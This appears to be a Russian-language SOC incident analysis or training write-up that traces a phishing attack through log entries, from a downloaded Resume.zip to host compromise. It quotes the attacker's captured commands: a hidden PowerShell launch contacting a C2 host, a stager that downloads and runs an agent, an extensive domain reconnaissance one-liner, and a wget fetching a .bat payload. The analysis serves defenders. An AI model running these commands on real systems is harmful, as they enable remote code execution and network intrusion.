# SOC-Enigma

Описание: Система UserGate Log Analyzer зафиксировала зафиксировала подозрительную активность - фишинг с последующей компрометацией хоста

## Этап 1: Фишинг
**Время 3:39** Пользователь получает письмо на сервис Outook, ссылку OneDrive и скачивает **Resume.zip**

```sh
-2022-08-02 03:39:22.234{289a599c-9c69-62e8-6e14-000000001900}9396C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exeC:\Users\Bob\Downloads\Resume.zip2022-08-02 
```

### Этап 2: Зауск файла resume.pdf.exe пользователем и дальнейшее развитие атаки
В 3:39 был запущен файл **resume.pdf.exe**. Данный файл при запуске пытается установить соединение с хостом 192.168.44.57:8888.

```sh
powershell.exe /c Start-Process -FilePath Resume.pdf.exe -ArgumentList '-server http://192.168.44.57:8888 -group red' -WindowStyle Hidden powershell.exe -ExecutionPolicy Bypass -C Clear-History;Clear
```

В 3:54 был создан процесс, который позволяет устанавливать связь с сервером.

```sh
HostApplication=powershell.exe -ExecutionPolicy Bypass -C if ($host.Version.Major -ge 3){$ErrAction= "ignore"}else{$ErrAction= "SilentlyContinue"};$server="http://0.0.0.0:8888";$socket="0.0.0.0:7010";$contact="tcp";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","manx.go");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","");Get-Process | ? {$_.Path -like "C:\Users\Public\$name.exe"} | stop-process -f -ea $ErrAction;rm -force "C:\Users\Public\$name.exe" -ea $ErrAction;([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-socket $socket -http $server -contact $contact" -WindowStyle hidden;
```

### Этап 3: Разведка системы
В 3:55 была произведена разведка системы:

```sh
C:\Windows\System32\cmd.execmd.exe /C @echo off&echo ________________________________Whoami______________________________ &  whoami &echo ________________________________HostName______________________________  & hostname  & echo ________________________________IpConfig______________________________ & ipconfig /all  & echo ____________________________AllLocalUsers___________________________ & net user /domain  & echo _________________________AllUserInDomain___________________________ & net group /domain  & echo __________________________DomianAdmins_______________________________ & net group "domain admins" /domain  & echo _______________________ExchangetrustedMembers_______________________ & net group "Exchange Trusted Subsystem" /domain  & echo ________________________NetAccountDomain____________________________ & net accounts /domain  & echo ______________________________NetUser________________________________ & net user  & echo _______________________NetLocalGroupMembers________________________ & net localgroup administrators  & echo ________________________________netstat_______________________________ & netstat -an  & echo ______________________________tasklist________________________________ & tasklist  & echo _____________________________systeminfo_______________________________ & systeminfo  & echo ________________________________RDP___________________________________ & reg query "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default"  & echo ________________________________Task__________________________________ & schtasks /query /FO List /TN "GoogleUpdatesTaskMachineUI" /V | findstr /b /n /c:"Repeat: Every:"  & echo ________________________________________AntiVirus______________________________ &WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
```

### Этап 4: Загрузка вредоносного .bat файла

В 4:02 был создан процесс, связанный с файлом **0000000000.bat**, который впоследствии становится файлом **1.bat**
```sh
powershell.exe -ExecutionPolicy Bypass -C "wget http://192.168.44.57:8000/0000000000.bat -OutFile c:\windows\temp\1.bat
```

Также замечен файл **1.log**, который, возможно, создается при работе **1.bat**
```sh
powershell.exe -ExecutionPolicy Bypass -C gc c:\windows\temp\1.log
```


